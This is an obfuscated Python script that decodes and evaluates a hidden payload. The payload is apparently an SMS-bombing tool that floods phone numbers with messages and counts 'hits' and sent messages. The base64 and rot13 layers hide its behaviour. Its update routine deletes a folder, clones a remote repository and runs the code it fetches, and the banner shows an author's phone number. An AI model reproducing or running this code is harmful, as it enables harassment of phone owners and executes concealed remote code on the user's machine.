# Python code obfuscated by TaNviiR-RiiYaD
 

import base64, codecs
magic = 'aW1wb3J0IG9zCmltcG9ydCB0aW1lCmltcG9ydCBnZXRwYXNzCnRyeToKICAgIGltcG9ydCByZXF1ZXN0cwpleGNlcHQgSW1wb3J0RXJyb3I6CiAgICBwcmludCgiXDAzM1s5Nm1bPl0gSW5zdGFsbGluZyBQYWNrYWdlLi4uLi4iKQogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCByZXF1ZXN0cycpCmVsc2U6CiAgICB0cnk6CiAgICAgICAgaW1wb3J0IHJlcXVlc3RzCiAgICBleGNlcHQgSW1wb3J0RXJyb3I6CiAgICAgICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCByZXF1ZXN0cycpCnRyeToKCWZyb20gcmVxdWVzdHMuc3RydWN0dXJlcyBpbXBvcnQgQ2FzZUluc2Vuc2l0aXZlRGljdApleGNlcHQgSW1wb3J0RXJyb3I6CiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJykKZWxzZToKICAgIHRyeToKICAgICAgICBpbXBvcnQgcmVxdWVzdHMKICAgIGV4Y2VwdCBJbXBvcnRFcnJvcjoKICAgICAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJykKI0NWQUxVRQpibHVlPSAnXDMzWzk0bScKbGlnaHRibHVlID0gJ1wwMzNbOTRtJwpyZWQgPSAnXDAzM1s5MW0nCndoaXRlID0gJ1wzM1s5N20nCnllbGxvdyA9ICdcMzNbOTNtJwpncmVlbiA9ICdcMDMzWzE7MzJtJwpjeWFuICA9ICJcMDMzWzk2bSIKZW5kID0gJ1wwMzNbMG0nCnB1cnBsZT0iXDAzM1swOzM1bSIKb3Muc3lzdGVtKCdjbGVhcicpCmxpbmU9eWVsbG93KyI9PT09PT09PT09PT09PT09PT09PSIrcHVycGxlKyI9PT09PT09PT09PT09PT09PT09PSIrcmVkKyI9PT09PT09PT09PT09PT09PT09PSIrcHVycGxlKyI9PT09PT09PT09PT09PT09PT09PSIreWVsbG93KyI9PT09PT09PT09PT09PT09PT09PSIreWVsbG93KyI9PT09PT09PT09PT09PT09PT09PSIrcHVycGxlKyI9PT09PT09PT09PT09PT09PT09PSIrcmVkKyI9PT09PT09PT09PT09PT09PT09PSIrcHVycGxlKyI9PT09PT09PT09PT09PT09PT09PSIreWVsbG93KyI9PT09PT09PT09PT09PT09PT09PSIKc3BhY2U9IiAiCmxvZ289eWVsbG93K3N0cigiIiIKICAg4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXCiAgIOKVkSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICDilZEKICAg4pWRICBBdXRob3IgOiBUYU52aVItQWhNZUQtUmlZYUQgICAgICAgICAgICAgICAgIOKVkQogICDilZEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg4pWRCiAgIOKVkSAgRmFjZWJvb2sgOiBATXJUYU52aWlSICAgICAgICAgICAgICAgICAgICAgICDilZEKICAg4pWRICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKVkQogICDilZEgIEltbyA6ICs4ODAxNjMyOTY0Nzg1ICAgICAgICAgICAgICAgICAgICAgICAg4pWRCiAgIOKVkSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICDilZEKICAg4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdIAogICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgdmVyc2lvbiA6IDIuMC4zCiIiIikKCiAgICAgIAogI0hFQURFUiAgICAgICAgICAgICAgICAKdGV4dD1saWdodGJsdWUrIlx0XHRDcmVhdGVkIEJ5IDogIit5ZWxsb3crIlRhTnZpaVIgUmlpWWFEIitjeWFuKyJcblxuXHRcdOKYheKYhSAiK3B1cnBsZSsiIFNlY3VyaXR5IENoZWNraW5nLi4u'
love = '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'
god = 'IityZWQrIlvDl10gMm5kIFNNUyBOb3QgU2VudC4iKQoJCQkJZWxpZiBhbW1vdW50Mj09MzoKCQkJCQlwcmludChjeWFuKyJcbiDimIXimIVGYWlsZWTimIXimIU9PT4gICAiK3JlZCsiW8OXXSAzcmQgU01TIE5vdCBTZW50LiIpCgkJCQllbHNlOgoJCQkJCXByaW50KGN5YW4rIlxuIOKYheKYhUZhaWxlZOKYheKYhT09PiAgICIrcmVkKyJbw5ddICIrc3RyKGFtbW91bnQyKSsidGggU01TIE5vdCBTZW50LiIpCgkJCQkJdGltZS5zbGVlcCgwLjAxKQoJCQkJCWFtbW91bnQyKz0xCgkJCQkJCQoJCQkJCQkJCQkKCQlvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vbS5mYWNlYm9vay5jb20vbXJ0YW52aWlyJykJCQkJCQkKCQl0b3RhbGhpdD1hbW1vdW50Mi0xCgkJdG90YWxub3RzZW50PXRvdGFsaGl0LXRvdGFsc2VudAoJCXByaW50KHB1cnBsZSsiXG5cblx0XHRb4oCiXSBUb3RhbCBIaXRzIDogIit5ZWxsb3crc3RyKHRvdGFsaGl0KSkKCQlwcmludChncmVlbisiXG5cdFx0W+Kck10gVG90YWwgU2VudCA6ICIreWVsbG93K3N0cih0b3RhbHNlbnQpKQoJCXByaW50KHJlZCsiXG5cdFx0W8OXXSBUb3RhbCBOb3QgU2VudCA6ICIreWVsbG93K3N0cih0b3RhbG5vdHNlbnQpKyJcbiIpCgkKCQlsYXN0dD1wcmludChwdXJwbGUrIlxuXG5cdFx0ICBb4pyTXSBBbGwgRG9uZSFcblx0IFvigKJdIE5vdyBQcmVzcyBFbnRlciBLZXkgVG8gQ29udGludWU6XG4iKQoKZGVmIGFib3V0KCk6CgkJb3Muc3lzdGVtKCdjbGVhcicpCgkJaGVhZGVyKCkKCQlwcmludChncmVlbisiXG5cblx0XHRUYU52aWlSIEFoTWVEIFJpaVlhRCIrZ3JlZW4rIlxuXG5cdFJvYmktQWlydGVsIENpcmNMZSBpaUQgOiIrYmx1ZSsiXG5cdFx0WzFdIFRhbnZpcjMyNTIiK2dyZWVuKyJcblx0XHRbMl0gU3VrSGhpTmppYjBOIitjeWFuKyJcblx0XHRbM10gMUJyMGtFbkhlQXJUIitibHVlKyJcblx0XHRbNF0gQ2hPY2tMYVRXYUxhIitncmVlbisiXG5cdFx0WzVdIGFMMDBOZUhlQXJUIiArY3lhbisiXG5cbiIrcHVycGxlKyJcblxuXHRCYW5nTGFMaW5rIENpcmNMZSBpaUQgOiIrZ3JlZW4rIlxuXHRcdFsxXSBTaUxlTnRDclkiK2N5YW4rIlxuXHRcdFsyXSBUYU52aWlSLVJpaVlhRCIrY3lhbisiXG5cblx0Rm9yIEFueSBIZWxwIE9mIENpcmNMZS4uLiBrbm9DayBtZSBPbiBpTW8gIitncmVlbisiXG5cblx0XHRQb3dlcmVkIGJ5IFRhTnZpaVItUmlpWWFEIitsaWdodGJsdWUrIlxuXG5cdFx0XHRb4pyTXSBBbGwgRG9uZSEiK2N5YW4rIlxuXHRcdFByZXNzIEVudGVyIEtleSBUbyBDb250aW51ZTpcbiIpCQkKCQkKCQpkZWYgdXBkYXRlKCk6CgkJCgkJb3Muc3lzdGVtKCJjbGVhciIpCgkJaGVhZGVyKCkKCQlsYXN0dD1nZXRwYXNzLmdldHBhc3MoY3lhbisiXG5cdCBwbGVhc2UgQmVmb3JlIFVwZGF0ZSB0aGUgVG9vbHNcblx0IENvbmZpcm0gSXQgVGhhdCdzIFlvdXIgTmV0d29yayBDb25uZWN0aW9uIElzIEdvb2RcblxuXG5cdFRoZW4gUHJlc3MgRW50ZXIgS2V5IFRvIENvbnRpbnVlIDogXG5cbiIpCgkJb3Muc3lzdGVtKCJjZCAmJiBybSAtcmYgQm9tYmVyIikKCQlvcy5zeXN0ZW0oImNkICYmIGdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vVGFOdmlpUi1SaWlZYUQvQm9tYmVyIikKCQlvcy5zeXN0ZW0oJ2NkICYmIGNkIEJvbWJlciAmJiBweXRob24zIG1haW4ucHknKQoJCW9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS9tcnRhbnZpaXInKQoKZGVmIGVtYWlsKCk6Cglvcy5zeXN0ZW0oJ3B5dGhvbjMgZW1haWx0b29sLnB5JykKCmRlZiBhYmMoKToKCW9zLnN5c3RlbSgnY2xlYXInKQoJaGVhZGVyKCkKCXByaW50KHllbGxvdysiQ2hvc2UgWW91ciBPcHRpb24gRnJvbSBCZWxvdyA6XG5cbiIrY3lhbisiWzFdIEZhY2Vib29rXG5cblsyXSBNZXNzZW5nZXJcblxuWzNdIEJhY2tc'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
